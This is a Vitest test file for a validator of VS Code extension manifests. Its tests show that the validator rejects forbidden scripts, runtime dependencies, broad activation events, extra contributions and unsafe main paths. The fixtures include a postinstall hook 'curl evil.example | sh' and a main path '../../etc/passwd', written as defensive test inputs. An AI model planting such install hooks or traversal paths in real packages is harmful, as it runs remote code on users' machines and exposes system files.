import { describe, expect, it } from "vitest";
import { validateExtensionManifest } from "./extension.js";
import { getRegisteredAction } from "../modes/repair/actions.js";

const action = getRegisteredAction("free-tcp-port");

describe("validateExtensionManifest", () => {
  it("accepts the real generated free-tcp-port extension project's package.json", () => {
    expect(action?.generateExtensionProject).toBeDefined();
    const files = action!.generateExtensionProject!({ port: 3000 });
    const manifest = files["package.json"];
    expect(manifest).toBeDefined();
    const result = validateExtensionManifest(manifest!);
    expect(result.findings).toEqual([]);
    expect(result.valid).toBe(true);
  });

  it("rejects invalid JSON", () => {
    expect(validateExtensionManifest("{not json").valid).toBe(false);
  });

  it("rejects a manifest missing required fields", () => {
    const result = validateExtensionManifest(JSON.stringify({ name: "x" }));
    expect(result.valid).toBe(false);
    expect(result.findings.some((f) => f.ruleId === "manifest-missing-field")).toBe(true);
  });

  it("rejects a manifest with a scripts field", () => {
    const manifest = {
      name: "x",
      publisher: "p",
      version: "0.0.1",
      main: "./extension.js",
      engines: { vscode: "^1.90.0" },
      activationEvents: ["onCommand:x.run"],
      contributes: { commands: [{ command: "x.run", title: "Run" }] },
      scripts: { postinstall: "curl evil.example | sh" },
    };
    const result = validateExtensionManifest(JSON.stringify(manifest));
    expect(result.findings.some((f) => f.ruleId === "manifest-forbidden-scripts")).toBe(true);
  });

  it("rejects a manifest declaring runtime dependencies", () => {
    const manifest = {
      name: "x",
      publisher: "p",
      version: "0.0.1",
      main: "./extension.js",
      engines: { vscode: "^1.90.0" },
      activationEvents: ["onCommand:x.run"],
      contributes: { commands: [{ command: "x.run", title: "Run" }] },
      dependencies: { "some-pkg": "^1.0.0" },
    };
    const result = validateExtensionManifest(JSON.stringify(manifest));
    expect(result.findings.some((f) => f.ruleId === "manifest-forbidden-dependency")).toBe(true);
  });

  it("rejects broad activation events", () => {
    const manifest = {
      name: "x",
      publisher: "p",
      version: "0.0.1",
      main: "./extension.js",
      engines: { vscode: "^1.90.0" },
      activationEvents: ["*"],
      contributes: { commands: [{ command: "x.run", title: "Run" }] },
    };
    const result = validateExtensionManifest(JSON.stringify(manifest));
    expect(result.findings.some((f) => f.ruleId === "manifest-broad-activation-event")).toBe(true);
  });

  it("rejects contributions beyond commands", () => {
    const manifest = {
      name: "x",
      publisher: "p",
      version: "0.0.1",
      main: "./extension.js",
      engines: { vscode: "^1.90.0" },
      activationEvents: ["onCommand:x.run"],
      contributes: { commands: [{ command: "x.run", title: "Run" }], configuration: {} },
    };
    const result = validateExtensionManifest(JSON.stringify(manifest));
    expect(result.findings.some((f) => f.ruleId === "manifest-unexpected-contribution")).toBe(true);
  });

  it("rejects a path-traversal main field", () => {
    const manifest = {
      name: "x",
      publisher: "p",
      version: "0.0.1",
      main: "../../etc/passwd",
      engines: { vscode: "^1.90.0" },
      activationEvents: ["onCommand:x.run"],
      contributes: { commands: [{ command: "x.run", title: "Run" }] },
    };
    const result = validateExtensionManifest(JSON.stringify(manifest));
    expect(result.findings.some((f) => f.ruleId === "manifest-unsafe-main")).toBe(true);
  });
});
